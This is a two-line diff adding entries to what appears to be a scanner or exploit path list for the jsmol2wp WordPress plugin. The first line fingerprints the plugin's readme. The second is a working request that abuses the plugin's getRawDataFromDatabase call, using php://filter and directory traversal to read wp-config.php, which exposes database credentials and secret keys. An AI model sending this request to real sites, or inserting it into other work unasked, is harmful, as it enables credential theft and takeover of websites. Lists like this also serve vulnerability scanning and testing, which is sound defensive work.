@@ -1,0 +1,2 @@
+/wp-content/plugins/jsmol2wp/readme.txt
+/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
